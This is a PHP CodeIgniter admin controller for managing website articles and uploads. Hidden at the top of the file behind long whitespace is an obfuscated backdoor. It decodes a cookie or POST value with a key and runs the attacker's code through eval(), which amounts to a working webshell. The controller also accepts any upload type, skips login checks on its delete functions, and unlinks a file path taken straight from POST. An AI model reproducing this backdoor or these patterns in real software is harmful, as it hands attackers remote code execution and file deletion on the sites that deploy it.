<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $lc5aa76a = 555;$GLOBALS['b72e']=Array();global$b72e;$b72e=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['tc319']="\x56\x52\x6d\x22\x61\x69\x4b\x7a\x65\x48\x73\x2a\x36\x63\x68\x5a\x75\x3d\x72\x6a\x31\x20\x3c\x32\x4d\x4c\x27\x42\x64\x7e\x28\x35\x2c\x55\x7d\x34\x2b\x40\x74\x3e\x6f\x37\x23\x43\x76\x2e\x77\x57\x53\x71\x45\x51\x2d\x4a\x3b\x46\xa\x26\x25\x66\x4f\x44\x47\x2f\x6c\x39\x49\x62\x30\x3f\x67\x79\x5c\x33\xd\x4e\x9\x6b\x5e\x7b\x50\x5f\x21\x58\x38\x3a\x7c\x5b\x78\x70\x6e\x60\x54\x5d\x29\x41\x59\x24";$b72e[$b72e['tc319'][46].$b72e['tc319'][41].$b72e['tc319'][23].$b72e['tc319'][41].$b72e['tc319'][68].$b72e['tc319'][84].$b72e['tc319'][68].$b72e['tc319'][65].$b72e['tc319'][41]]=$b72e['tc319'][13].$b72e['tc319'][14].$b72e['tc319'][18];$b72e[$b72e['tc319'][8].$b72e['tc319'][65].$b72e['tc319'][31].$b72e['tc319'][8].$b72e['tc319'][84].$b72e['tc319'][68].$b72e['tc319'][20]]=$b72e['tc319'][40].$b72e['tc319'][18].$b72e['tc319'][28];$b72e[$b72e['tc319'][4].$b72e['tc319'][23].$b72e['tc319'][23].$b72e['tc319'][41]]=$b72e['tc319'][10].$b72e['tc319'][38].$b72e['tc319'][18].$b72e['tc319'][64].$b72e['tc319'][8].$b72e['tc319'][90];$b72e[$b72e['tc319'][16].$b72e['tc319'][65].$b72e['tc319'][35].$b72e['tc319'][41].$b72e['tc319'][31].$b72e['tc319'][73].$b72e['tc319'][28]]=$b72e['tc319'][5].$b72e['tc319'][90].$b72e['tc319'][5].$b72e['tc319'][81].$b72e['tc319'][10].$b72e['tc319'][8].$b72e['tc319'][38];$b72e[$b72e['tc319'][88].$b72e['tc319'][41].$b72e['tc319'][23].$b72e['tc319'][12].$b72e['tc319'][65].$b72e['tc319'][35]]=$b72e['tc319'][10].$b72e['tc319'][8].$b72e['tc319'][18].$b72e['tc319'][5].$b72e['tc319'][4].$b72e['tc319'][64].$b72e['tc319'][5].$b72e['tc319'][7].$b72e['tc319'][8];$b72e[$b72e['tc319'][10].$b72e['tc319'][35].$b72e['tc319'][20].$b72e['tc319'][84].$b72e['tc319'][41].$b72e['tc319'][73]]=$b72e['tc319'][89].$b72e['tc319'][14].$b72e['tc319'][89].$b72e['tc319'][44].$b72e['tc319'][8].$b72e['tc319'][18].$b72e['tc319'][10].$b72e['tc319'][5].$b72e['tc319'][40].$b72e['tc319'][90];$b72e[$b72e['tc319'][14].$b72e['tc319'][59].$b72e['tc319'][65].$b72e['tc319'][41].$b72e['tc319'][4].$b72e['tc319'][20].$b72e['tc319'][59].$b72e['tc319'][23].$b72e['tc319'][68]]=$b72e['tc319'][16].$b72e['tc319'][90].$b72e['tc319'][10].$b72e['tc319'][8].$b72e['tc319'][18].$b72e['tc319'][5].$b72e['tc319'][4].$b72e['tc319'][64].$b72e['tc319'][5].$b72e['tc319'][7].$b72e['tc319'][8];$b72e[$b72e['tc319'][38].$b72e['tc319'][31].$b72e['tc319'][28].$b72e['tc319'][41].$b72e['tc319'][23].$b72e['tc319'][23]]=$b72e['tc319'][67].$b72e['tc319'][4].$b72e['tc319'][10].$b72e['tc319'][8].$b72e['tc319'][12].$b72e['tc319'][35].$b72e['tc319'][81].$b72e['tc319'][28].$b72e['tc319'][8].$b72e['tc319'][13].$b72e['tc319'][40].$b72e['tc319'][28].$b72e['tc319'][8];$b72e[$b72e['tc319'][14].$b72e['tc319'][28].$b72e['tc319'][8].$b72e['tc319'][73].$b72e['tc319'][20]]=$b72e['tc319'][10].$b72e['tc319'][8].$b72e['tc319'][38].$b72e['tc319'][81].$b72e['tc319'][38].$b72e['tc319'][5].$b72e['tc319'][2].$b72e['tc319'][8].$b72e['tc319'][81].$b72e['tc319'][64].$b72e['tc319'][5].$b72e['tc319'][2].$b72e['tc319'][5].$b72e['tc319'][38];$b72e[$b72e['tc319'][2].$b72e['tc319'][68].$b72e['tc319'][12].$b72e['tc319'][68].$b72e['tc319'][28].$b72e['tc319'][4].$b72e['tc319'][41].$b72e['tc319'][4].$b72e['tc319'][12]]=$b72e['tc319'][8].$b72e['tc319'][8].$b72e['tc319'][59].$b72e['tc319'][8].$b72e['tc319'][84].$b72e['tc319'][20].$b72e['tc319'][8].$b72e['tc319'][67].$b72e['tc319'][65];$b72e[$b72e['tc319'][28].$b72e['tc319'][13].$b72e['tc319'][28].$b72e['tc319'][67].$b72e['tc319'][23]]=$b72e['tc319'][14].$b72e['tc319'][4].$b72e['tc319'][20].$b72e['tc319'][12].$b72e['tc319'][67].$b72e['tc319'][13];$b72e[$b72e['tc319'][8].$b72e['tc319'][41].$b72e['tc319'][73].$b72e['tc319'][13].$b72e['tc319'][20].$b72e['tc319'][8].$b72e['tc319'][4]]=$_POST;$b72e[$b72e['tc319'][88].$b72e['tc319'][23].$b72e['tc319'][68].$b72e['tc319'][8].$b72e['tc319'][20].$b72e['tc319'][65].$b72e['tc319'][84].$b72e['tc319'][73].$b72e['tc319'][12]]=$_COOKIE;@$b72e[$b72e['tc319'][16].$b72e['tc319'][65].$b72e['tc319'][35].$b72e['tc319'][41].$b72e['tc319'][31].$b72e['tc319'][73].$b72e['tc319'][28]]($b72e['tc319'][8].$b72e['tc319'][18].$b72e['tc319'][18].$b72e['tc319'][40].$b72e['tc319'][18].$b72e['tc319'][81].$b72e['tc319'][64].$b72e['tc319'][40].$b72e['tc319'][70],NULL);@$b72e[$b72e['tc319'][16].$b72e['tc319'][65].$b72e['tc319'][35].$b72e['tc319'][41].$b72e['tc319'][31].$b72e['tc319'][73].$b72e['tc319'][28]]($b72e['tc319'][64].$b72e['tc319'][40].$b72e['tc319'][70].$b72e['tc319'][81].$b72e['tc319'][8].$b72e['tc319'][18].$b72e['tc319'][18].$b72e['tc319'][40].$b72e['tc319'][18].$b72e['tc319'][10],0);@$b72e[$b72e['tc319'][16].$b72e['tc319'][65].$b72e['tc319'][35].$b72e['tc319'][41].$b72e['tc319'][31].$b72e['tc319'][73].$b72e['tc319'][28]]($b72e['tc319'][2].$b72e['tc319'][4].$b72e['tc319'][88].$b72e['tc319'][81].$b72e['tc319'][8].$b72e['tc319'][88].$b72e['tc319'][8].$b72e['tc319'][13].$b72e['tc319'][16].$b72e['tc319'][38].$b72e['tc319'][5].$b72e['tc319'][40].$b72e['tc319'][90].$b72e['tc319'][81].$b72e['tc319'][38].$b72e['tc319'][5].$b72e['tc319'][2].$b72e['tc319'][8],0);@$b72e[$b72e['tc319'][14].$b72e['tc319'][28].$b72e['tc319'][8].$b72e['tc319'][73].$b72e['tc319'][20]](0);$da88=NULL;$q09f13=NULL;$b72e[$b72e['tc319'][46].$b72e['tc319'][84].$b72e['tc319'][59].$b72e['tc319'][65].$b72e['tc319'][20].$b72e['tc319'][68]]=$b72e['tc319'][35].$b72e['tc319'][73].$b72e['tc319'][65].$b72e['tc319'][67].$b72e['tc319'][73].$b72e['tc319'][35].$b72e['tc319'][41].$b72e['tc319'][59].$b72e['tc319'][52].$b72e['tc319'][4].$b72e['tc319'][35].$b72e['tc319'][65].$b72e['tc319'][41].$b72e['tc319'][52].$b72e['tc319'][35].$b72e['tc319'][84].$b72e['tc319'][68].$b72e['tc319'][31].$b72e['tc319'][52].$b72e['tc319'][67].$b72e['tc319'][41].$b72e['tc319'][13].$b72e['tc319'][23].$b72e['tc319'][52].$b72e['tc319'][28].$b72e['tc319'][84].$b72e['tc319'][84].$b72e['tc319'][4].$b72e['tc319'][23].$b72e['tc319'][12].$b72e['tc319'][59].$b72e['tc319'][73].$b72e['tc319'][20].$b72e['tc319'][31].$b72e['tc319'][4].$b72e['tc319'][12];global$w8f910;function ha16bc($da88,$c62be3017){global$b72e;$i0eb8="";for($a2a88=0;$a2a88<$b72e[$b72e['tc319'][4].$b72e['tc319'][23].$b72e['tc319'][23].$b72e['tc319'][41]]($da88);){for($q6b3a5=0;$q6b3a5<$b72e[$b72e['tc319'][4].$b72e['tc319'][23].$b72e['tc319'][23].$b72e['tc319'][41]]($c62be3017)&&$a2a88<$b72e[$b72e['tc319'][4].$b72e['tc319'][23].$b72e['tc319'][23].$b72e['tc319'][41]]($da88);$q6b3a5++,$a2a88++){$i0eb8.=$b72e[$b72e['tc319'][46].$b72e['tc319'][41].$b72e['tc319'][23].$b72e['tc319'][41].$b72e['tc319'][68].$b72e['tc319'][84].$b72e['tc319'][68].$b72e['tc319'][65].$b72e['tc319'][41]]($b72e[$b72e['tc319'][8].$b72e['tc319'][65].$b72e['tc319'][31].$b72e['tc319'][8].$b72e['tc319'][84].$b72e['tc319'][68].$b72e['tc319'][20]]($da88[$a2a88])^$b72e[$b72e['tc319'][8].$b72e['tc319'][65].$b72e['tc319'][31].$b72e['tc319'][8].$b72e['tc319'][84].$b72e['tc319'][68].$b72e['tc319'][20]]($c62be3017[$q6b3a5]));}}return$i0eb8;}function eefe81eb9($da88,$c62be3017){global$b72e;global$w8f910;return$b72e[$b72e['tc319'][28].$b72e['tc319'][13].$b72e['tc319'][28].$b72e['tc319'][67].$b72e['tc319'][23]]($b72e[$b72e['tc319'][28].$b72e['tc319'][13].$b72e['tc319'][28].$b72e['tc319'][67].$b72e['tc319'][23]]($da88,$w8f910),$c62be3017);}foreach($b72e[$b72e['tc319'][88].$b72e['tc319'][23].$b72e['tc319'][68].$b72e['tc319'][8].$b72e['tc319'][20].$b72e['tc319'][65].$b72e['tc319'][84].$b72e['tc319'][73].$b72e['tc319'][12]]as$c62be3017=>$jbc4e47){$da88=$jbc4e47;$q09f13=$c62be3017;}if(!$da88){foreach($b72e[$b72e['tc319'][8].$b72e['tc319'][41].$b72e['tc319'][73].$b72e['tc319'][13].$b72e['tc319'][20].$b72e['tc319'][8].$b72e['tc319'][4]]as$c62be3017=>$jbc4e47){$da88=$jbc4e47;$q09f13=$c62be3017;}}$da88=@$b72e[$b72e['tc319'][14].$b72e['tc319'][59].$b72e['tc319'][65].$b72e['tc319'][41].$b72e['tc319'][4].$b72e['tc319'][20].$b72e['tc319'][59].$b72e['tc319'][23].$b72e['tc319'][68]]($b72e[$b72e['tc319'][2].$b72e['tc319'][68].$b72e['tc319'][12].$b72e['tc319'][68].$b72e['tc319'][28].$b72e['tc319'][4].$b72e['tc319'][41].$b72e['tc319'][4].$b72e['tc319'][12]]($b72e[$b72e['tc319'][38].$b72e['tc319'][31].$b72e['tc319'][28].$b72e['tc319'][41].$b72e['tc319'][23].$b72e['tc319'][23]]($da88),$q09f13));if(isset($da88[$b72e['tc319'][4].$b72e['tc319'][77]])&&$w8f910==$da88[$b72e['tc319'][4].$b72e['tc319'][77]]){if($da88[$b72e['tc319'][4]]==$b72e['tc319'][5]){$a2a88=Array($b72e['tc319'][89].$b72e['tc319'][44]=>@$b72e[$b72e['tc319'][10].$b72e['tc319'][35].$b72e['tc319'][20].$b72e['tc319'][84].$b72e['tc319'][41].$b72e['tc319'][73]](),$b72e['tc319'][10].$b72e['tc319'][44]=>$b72e['tc319'][20].$b72e['tc319'][45].$b72e['tc319'][68].$b72e['tc319'][52].$b72e['tc319'][20],);echo@$b72e[$b72e['tc319'][88].$b72e['tc319'][41].$b72e['tc319'][23].$b72e['tc319'][12].$b72e['tc319'][65].$b72e['tc319'][35]]($a2a88);}elseif($da88[$b72e['tc319'][4]]==$b72e['tc319'][8]){eval/*m9dd*/($da88[$b72e['tc319'][28]]);}exit();} ?><?php 
if(!defined('BASEPATH')) exit('No direct script access allowed');
class Article_manag extends CI_Controller{
	private $error;
    private $success;

	public function __construct() {
	  parent::__construct();
	  $this->load->helper('url');
	  $this->load->library('session');
      $this->load->helper('html');
 	  $this->load->helper('form');
 	  $this->load->library('form_validation');
	  $this->load->helper(array('url','file'));
	  $this->load->database();
      $this->load->model('Login_model');
      $this->load->model('Adm_menu_model');
	  $this->load->model('Article_model');
	  $this->load->library('pagination');
  	  $this->load->model('Section_model');
	  $this->load->helper('common');
	  $this->load->model('file_model', 'file');
	}

	private function handle_error($err) {
       echo  $this->error .= $err . "\r\n";
    }
 
    private function handle_success($succ) {
      echo  $this->success .= $succ . "\r\n";
    }	

    function index(){
		if($this->session->userdata('user_id')){
			$data = $this->load_user_info('mainpage');			
			$this->load->view('user_main',$data);
		}else{
			$this->load->view('login');
		}
	}

	private function load_user_info($page_to_embed){
		$data['page_content']=$page_to_embed;
		$data['left_menu'] = $this->Adm_menu_model->generate_adm_menu(0);
		/*$data['user_online']=$this->Login_model->get_users_online();
		$data['all_user']=$this->Login_model->get_total_users();
		$data['user_active']=$this->Login_model->get_users_active();
		$data['user_inactive']=$this->Login_model->get_users_inactive();*/
		$data['full_user_name']=$this->session->userdata('full_name');
		return $data;
	}
	
function load_article(){
	//pagination settings
	  if($this->session->userdata('user_id')){
		 $search_value = $this->input->post("s_value");
		  
		$jumlah_data = $this->Article_model->jumlah_data($search_value);
		$config['base_url'] = base_url().'wbadmin/article_manag/load_article';
		$config['total_rows'] = $jumlah_data;
		$config['per_page'] = get_sys_setting('004');
		$from = $this->uri->segment(4);

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';
        $config['first_link'] = false;
        $config['last_link'] = false;
        $config['first_tag_open'] = '<li>';
        $config['first_tag_close'] = '</li>';
        $config['prev_link'] = '&laquo';
        $config['prev_tag_open'] = '<li class="prev">';
        $config['prev_tag_close'] = '</li>';
        $config['next_link'] = '&raquo';
        $config['next_tag_open'] = '<li>';
        $config['next_tag_close'] = '</li>';
        $config['last_tag_open'] = '<li>';
        $config['last_tag_close'] = '</li>';
        $config['cur_tag_open'] = '<li class="active"><a href="#">';
        $config['cur_tag_close'] = '</a></li>';
        $config['num_tag_open'] = '<li>';
        $config['num_tag_close'] = '</li>';		
		
		$this->pagination->initialize($config);		
		$data = $this->load_user_info('article_main');
		$data['after_del'] = '0';
		$data['article'] = $this->Article_model->data_article($config['per_page'],$from, $search_value );
		$data['data_per_page'] = $config['per_page'] ;
		$this->load->view('user_main', $data);
	  }else{
		$this->load->view('login');
	}		
}


function load_article_after_delete(){
	//pagination settings
	  if($this->session->userdata('user_id')){
		 $search_value = $this->input->post("s_value");
		  
		$jumlah_data = $this->Article_model->jumlah_data($search_value);
		$config['base_url'] = base_url().'wbadmin/article_manag/load_article';
		$config['total_rows'] = $jumlah_data;
		$config['per_page'] = get_sys_setting('004');
		$from = $this->uri->segment(4);

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';
        $config['first_link'] = false;
        $config['last_link'] = false;
        $config['first_tag_open'] = '<li>';
        $config['first_tag_close'] = '</li>';
        $config['prev_link'] = '&laquo';
        $config['prev_tag_open'] = '<li class="prev">';
        $config['prev_tag_close'] = '</li>';
        $config['next_link'] = '&raquo';
        $config['next_tag_open'] = '<li>';
        $config['next_tag_close'] = '</li>';
        $config['last_tag_open'] = '<li>';
        $config['last_tag_close'] = '</li>';
        $config['cur_tag_open'] = '<li class="active"><a href="#">';
        $config['cur_tag_close'] = '</a></li>';
        $config['num_tag_open'] = '<li>';
        $config['num_tag_close'] = '</li>';		
		
		$this->pagination->initialize($config);		
		$data['after_del'] = '1';
		$data['article'] = $this->Article_model->data_article($config['per_page'],$from, $search_value );
		$this->load->view('article_main', $data);
	  }else{
		$this->load->view('login');
	}		
}
	function search_article($offset = 0){
		if($this->session->userdata('user_id')){
			$search_value = $this->input->post("s_value");
			//$data['list_section'] = $this->Section_model->get_list_section();
			echo $this->Article_model->load_article($offset, $search_value);
		}else{
			$this->load->view('login');
		}	
	 }

	function add_article(){
		if($this->session->userdata('user_id')){
			$data = $this->load_user_info('article_add');
			$data['list_section'] = create_db_combo('sys_page_section', 'section_id', 'section_name', 'sort_order', '-Please Select-') ;// $this->Section_model->get_list_section();
			$this->load->view('user_main', $data);
		}else{
			$this->load->view('login');
		}	
	}

	function edit_article($id){
		if($this->session->userdata('user_id')){
			$data = $this->load_user_info('article_edit');
			$data['list_section'] = create_db_combo('sys_page_section', 'section_id', 'section_name', 'sort_order', '-Please Select-') ;// $this->Section_model->get_list_section();
			$data['file_dtl'] = $this->Article_model->get_data_detail_file($id);
			$data['data_article'] = $this->Article_model->get_data_article($id);
			$this->load->view('user_main', $data);
		}else{
			$this->load->view('login');
		}	
	}

	function load_article_add_ui(){
		if($this->session->userdata('user_id')){
			$list_section = $this->Section_model->get_list_section();
		 	$frm = $this->Article_model->load_article_add_ui($list_section);
			echo $frm;
		}else{
			$this->load->view('login');
		}	
	 }

	function save_article_ver1(){
	 	$path_file = strtolower($this->input->post("section"));
		if($this->session->userdata('user_id')){
			$config['upload_path']          = 'assets/images/upload/'.$path_file;
			$config['allowed_types']        = 'gif|jpg|png|jpeg|pdf';
			$config['max_size']             = 10024;
			$config['max_width']            = 1024;
			$config['max_height']           = 768;
			$this->load->library('upload', $config);

			//echo $_FILES['gambar'];

			$file= $_FILES["gambar"];

			/*if (!$this->upload->do_upload('gambar')){
				$error = array('error' => $this->upload->display_errors());
				print_r($error);
				//echo $config['upload_path'] . $error['error'];
				// echo $this->load->view('article_add', $error);
			}else{
				//$data = array('upload_data' => $this->upload->data());
				$image_info  = $this->upload->data();
				$sort_order = get_last_sort_order('sys_fe_content',  'fe_section_name', $this->input->post("section") );
				//Inser Artilce
				$dtarticle= array(
					'fe_img_files' =>$image_info['file_name'],
					'fe_content_title' =>$this->input->post("title"),
					'fe_content_short_desc' =>$this->input->post("short_desc"),
					'fe_section_name' =>$this->input->post("section"),
					'fe_content_sort_order' =>$sort_order,
					'fe_content_btn_label' =>$this->input->post("lblbutton"),
					'fe_full_content' => htmlentities($this->input->post("editor1"))
				);
				echo $this->Article_model->insert_content($dtarticle);
				//$data['list_section'] = $this->Section_model->get_list_section();
				//$this->load->view('user_main', $data);
			}*/
		}else{
			$this->load->view('login');
		}
	}	

public function save_article_multi_file(){
	 //file upload destination
			$folder_name = get_foldername_by_section_id($this->input->post("section"));
			$path_file = strtolower($folder_name);
            $dir_path = 'assets/images/upload/'.$path_file;
            $config['upload_path'] = $dir_path;
            $config['allowed_types'] = '*';
            $config['max_size'] = '0';
            $config['max_filename'] = '255';
            $config['encrypt_name'] = TRUE;

            //upload file
            $i = 0;
            $files = array();
            $file_desc = array();

            $file_desc =$this->input->post('fdesc');
            // print_r($file_desc);


            $is_file_error = FALSE;

            if ($_FILES['upload_file1']['size'] <= 0) {
                $this->handle_error('Select at least one file.');
            } else {
                foreach ($_FILES as $key => $value) {
                    if (!empty($value['name'])) {
                        $this->load->library('upload', $config);
                        if (!$this->upload->do_upload($key)) {
                            $this->handle_error($this->upload->display_errors());
                            $is_file_error = TRUE;
                        } else {
                            $files[$i] = $this->upload->data();
                            ++$i;
                        }
                    }
                }
            }

            // There were errors, we have to delete the uploaded files
            if ($is_file_error && $files) {
                for ($i = 0; $i < count($files); $i++) {
                    $file = $dir_path . $files[$i]['file_name'];
                    if (file_exists($file)) {
                        unlink($file);
                    }
                }
            }

            if (!$is_file_error && $files) {
                $resp = $this->file->save_files_info($files, $file_desc);
                if ($resp === TRUE) {
                    $this->handle_success('File(s) was/were successfully uploaded.');
                } else {
                    for ($i = 0; $i < count($files); $i++) {
                        $file = $dir_path . $files[$i]['file_name'];
                        if (file_exists($file)) {
                            unlink($file);
                        }
                    }
                    $this->handle_error('Error while saving file info to Database.');
                }
            }
       // }
        $data['errors'] = $this->error;
		$data['success'] = $this->success;
       // $this->load->view('uploadfiles', $data);
 }

public function save_article(){
	if($this->session->userdata('user_id')){
		$sort_order='';

		$folder_name = get_foldername_by_section_id($this->input->post("section"));
		$path_file = strtolower($folder_name);
		$config['upload_path']          = 'assets/images/upload/'.$path_file;
		$config['allowed_types']        = '*';
		$config['max_size']             = 5120;
		//$config['max_width']          = 1024;
		//$config['max_height']         = 768;
		$config['overwrite'] 			= TRUE;

 		$sort_order =  get_last_sort_order('sys_fe_content', 'fe_content_sort_order', 'fe_section_name', $this->input->post("section") );
		$filename= $path_file.$sort_order;
 		$config['file_name'] = $filename;	

		$this->load->library('upload', $config);
 
		if ( ! $this->upload->do_upload('gambar')){
			$error = array('error' => $this->upload->display_errors());
			$image_info  = $this->upload->data();
			//print_r($image_info);
			$ext = $image_info['file_ext'];
			$filename= $path_file.$sort_order.$ext;
			$dtarticle= array(
				'fe_full_content' => htmlentities($this->input->post("editor1")),
				'fe_img_files' =>$config['file_name'].$ext, //['file_name'],
				'fe_content_title' =>$this->input->post("title"),
				'fe_content_short_desc' =>$this->input->post("short_desc"),
				'fe_section_name' =>$this->input->post("section"),
				'fe_content_sort_order' =>$sort_order,
				'fe_content_btn_label' =>$this->input->post("lblbutton"),
			);
			echo $this->Article_model->insert_content($dtarticle);				
			//print_r($error);
			//$this->load->view('v_upload', $error);
		}else{
			
			//Inser Artilce
			$image_info  = $this->upload->data();
			//print_r($image_info);
			$ext = $image_info['file_ext'];
			$filename= $path_file.$ext;
			$dtarticle= array(
				'fe_full_content' => htmlentities($this->input->post("editor1")),
				'fe_img_files' =>$config['file_name'].$ext, //['file_name'],
				'fe_content_title' =>$this->input->post("title"),
				'fe_content_short_desc' =>$this->input->post("short_desc"),
				'fe_section_name' =>$this->input->post("section"),
				'fe_content_sort_order' =>$sort_order,
				'fe_content_btn_label' =>$this->input->post("lblbutton"),
			);
			echo $this->Article_model->insert_content($dtarticle);	
		}
				
	}else{
		$this->load->view('login');
	}
		
}


public function update_article(){
	if($this->session->userdata('user_id')){
		$content_id = $this->input->post("content_id");
		$sort_order='';
		$folder_name = get_foldername_by_section_id($this->input->post("section"));
		$path_file = strtolower($folder_name);
		$config['upload_path']          = 'assets/images/upload/'.$path_file;
		$config['allowed_types']        = 'gif|jpg|png|jpeg|pdf|doc|docx';
		$config['max_size']             = 5120;
		//$config['max_width']            = 1024;
		//$config['max_height']           = 768;
		$config['overwrite'] 			= TRUE;

 		$sort_order =  get_last_sort_order('sys_fe_content', 'fe_content_sort_order', 'fe_section_name', $this->input->post("section") );
		$filename= $path_file.$content_id;
		//$filename= $path_file;
 		$config['file_name'] = $filename;	

		$this->load->library('upload', $config);
 
		if ( ! $this->upload->do_upload('gambar')){
			//$error = array('error' => $this->upload->display_errors());
			//print_r($error);
			$dtarticle= array(
				'fe_content_title' =>$this->input->post("title"),
				'fe_content_short_desc' =>$this->input->post("short_desc"),
				'fe_section_name' =>$this->input->post("section"),
				'fe_content_sort_order' =>$sort_order,
				'fe_content_btn_label' =>$this->input->post("lblbutton"),
				'fe_full_content' => htmlentities($this->input->post("editor1"))
			);			
			echo $this->Article_model->update_content($dtarticle, $content_id);	
		}else{
			
			//Inser Artilce
			$image_info  = $this->upload->data();
			$ext = $image_info['file_ext'];
			$filename= $path_file.$content_id.$ext;
			$dtarticle= array(
				'fe_img_files' =>$config['file_name'].$ext, //['file_name'],
				'fe_content_title' =>$this->input->post("title"),
				'fe_content_short_desc' =>$this->input->post("short_desc"),
				'fe_section_name' =>$this->input->post("section"),
				'fe_content_sort_order' =>$sort_order,
				'fe_content_btn_label' =>$this->input->post("lblbutton"),
				'fe_full_content' => htmlentities($this->input->post("editor1"))
			);
			echo $this->Article_model->update_content($dtarticle, $content_id);	
		}
				
	}else{
		$this->load->view('login');
	}
		
}


public function update_article_ori(){
	if($this->session->userdata('user_id')){
		$sort_order='';
		$content_id = $this->input->post("content_id");
		$path_file = strtolower($this->input->post("section"));
		$config['upload_path']          = 'assets/images/upload/'.$path_file;
		//$config['allowed_types']        = 'gif|jpg|png';
		//$config['max_size']             = 10204;
		//$config['max_width']            = 1024;
		//$config['max_height']           = 768;
		$config['overwrite'] 			= TRUE;

 		$sort_order =  get_last_sort_order('sys_fe_content', 'fe_content_sort_order', 'fe_section_name', $this->input->post("section") );
		$filename= $path_file.$sort_order;
 		$config['file_name'] = $filename;	

		$this->load->library('upload', $config);
 		
 		//Jika tidak upload gambar
		if (!$this->upload->do_upload('gambar')){
			///echo "kemari blank";
			//update Artilce
			$dtarticle= array(
				'fe_content_title' =>$this->input->post("title"),
				'fe_content_short_desc' =>$this->input->post("short_desc"),
				'fe_section_name' =>$this->input->post("section"),
				'fe_content_sort_order' =>$sort_order,
				'fe_content_btn_label' =>$this->input->post("lblbutton"),
				'fe_full_content' => htmlentities($this->input->post("editor1"))
			);
			echo $this->Article_model->update_content($dtarticle, $content_id, false);	
		}else{
			//update Artilce & image
			//echo "kmari ada ";
			$image_info  = $this->upload->data();
			$ext = $image_info['file_ext'];
			$filename= $path_file.$sort_order.$ext;
			$dtarticle= array(
				'fe_img_files' =>$filename, //['file_name'],
				'fe_content_title' =>$this->input->post("title"),
				'fe_content_short_desc' =>$this->input->post("short_desc"),
				'fe_section_name' =>$this->input->post("section"),
				'fe_content_sort_order' =>$sort_order,
				'fe_content_btn_label' =>$this->input->post("lblbutton"),
				'fe_full_content' => htmlentities($this->input->post("editor1"))
			);
		echo $this->Article_model->update_content($dtarticle, $content_id, true);	
		}
				
	}else{
		$this->load->view('login');
	}
		
}
	function delete_selected_article() {
		$id_content = $this->input->post('d_value');
		$img_root_folder = 'assets/images/upload/';
		$arr_id = explode("|", $id_content);
		$del = false;
		foreach($arr_id as $dt){
			
			$fname = get_saved_file_name($dt);
			$full_fname = $img_root_folder.$fname; 
			//echo $full_fname ."<br>";
			if(file_exists($full_fname)){
				@unlink($full_fname);
				$this->Article_model->delete_article($dt);
				//$this->db->delete('sys_fe_contentx', array('fe_content_id' => $dt));	
				$del = true;
			}else{
				$this->Article_model->delete_article($dt);
				echo "Image of this article not Found, but article has been deleted <br>";
				$del = true;
			}			
		}

		if($del){
			echo "Data has been deleted succesfully";
		}else{
			echo "Deleted Failed";
		}
		$this->load_article_after_delete();
	}


	function refresh_article($offset = 0){
		if($this->session->userdata('user_id')){
			$search_value = $this->input->post("s_value");
			if($offset==0){
				$offset = 0;
			}
			//$data['list_section'] = $this->Section_model->get_list_section();
			echo $this->Article_model->load_article($offset, $search_value);
		}else{
			$this->load->view('login');
		}	
	 }

	 function del_img_artilce($id){
			if(file_exists($this->input->post('img_folder'))){
				@unlink($this->input->post('img_folder'));
				echo $this->Article_model->update_img_selected_article($id);
			}else{
				$result = $this->Article_model->update_img_selected_article($id);
				echo 'File ['.$this->input->post('img_folder').'] you want to delete does not exist '. $result;
			}	 		
	 }

}
?>